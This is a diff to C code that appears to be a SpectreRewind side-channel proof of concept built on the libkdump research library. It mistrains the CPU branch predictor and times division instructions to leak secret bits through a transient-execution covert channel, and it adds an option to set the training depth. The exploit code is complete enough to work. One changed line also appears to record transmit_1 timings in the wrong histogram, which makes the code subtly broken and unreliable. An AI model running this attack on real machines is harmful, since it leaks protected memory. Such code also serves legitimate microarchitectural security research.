@@ -12,6 +12,7 @@
 /**************************************************************************
  * Conditional Compilation Options
  **************************************************************************/
+#define _GNU_SOURCE             /* See feature_test_macros(7) */
 
 /**************************************************************************
  * Included Files
@@ -57,6 +58,7 @@ static volatile uint64_t counter = 0;
 static libkdump_config_t config;
 typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
 static pthread_t count_thread;
+static int g_bp_depth = 9;
 
 /**************************************************************************
  * Public Function Prototypes
@@ -142,28 +144,7 @@ struct div_test transmit;
  * all others    7
  * default       9 (works on all tested platforms)
  */ 
-struct div_test *test_tasks[] = {
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &transmit_0,
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &trainer,
-    &transmit_1,
-};
+struct div_test *test_tasks[20];
 
 int __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
 {
@@ -243,27 +224,29 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
   transmit_1.div = 1;
   transmit_1.addr = &ones; // (char *)libkdump_phys_to_virt(libkdump_virt_to_phys((size_t)&ones));
   
-  int n_addr = sizeof(test_tasks)/sizeof(test_tasks[0]);
+  int n_addr = (g_bp_depth + 1) * 2; //
+
+  for (int i = 0; i < n_addr; i++)
+    test_tasks[i] = &trainer;
+  test_tasks[g_bp_depth] = &transmit_0;
+  test_tasks[2*g_bp_depth+1] = &transmit_1;
 
   bw_start = now_in_ns();
   for (int j = 0; j < N_TESTS; j++) {
     for (int i = 0; i < n_addr; i++) {
       for (volatile int iter = 0; iter < 13; iter++); // IMPORTANT: add delay (> 13).
-        
+      
       start = rdtsc();
       transmit_bit(test_tasks[i], i%8); // send secret when (i%8==7).
       end = rdtsc();
       
       dur = end - start;
       if (test_tasks[i] == &transmit_0) {
-        if (dur < MAX_CYCLES) histo[0][dur]++;                    
-        total[0][j] = dur;
+	if (dur < MAX_CYCLES) histo[0][dur]++;
+	total[0][j] = dur;
       } else if (test_tasks[i] == &transmit_1) {
-        if (dur < MAX_CYCLES) histo[1][dur]++;          
-        total[1][j] = dur;
-      } else if ( test_tasks[i] == &transmit) {
-        if (dur < MAX_CYCLES) histo[2][dur]++;
-        total[2][j] = dur;
+	if (dur < MAX_CYCLES) histo[0][dur]++;
+	total[1][j] = dur;
       }
     }
   }
@@ -311,6 +294,16 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
 
 int main(int argc, char *argv[])
 {
+  int opt;
+  while ((opt = getopt(argc, argv, "b:")) != -1) {
+    switch(opt) {
+    case 'b': /* # iterations need to mistrain the branch predictor */
+      g_bp_depth = strtol(optarg, NULL, 0);
+      break;
+    }
+  }
+  debug(INFO, "BP training depth: %d\n", g_bp_depth);
+  
   if (setpriority(PRIO_PROCESS, 0, -20) < 0) {
     debug(ERROR, "priority -20 failed\n");
   }
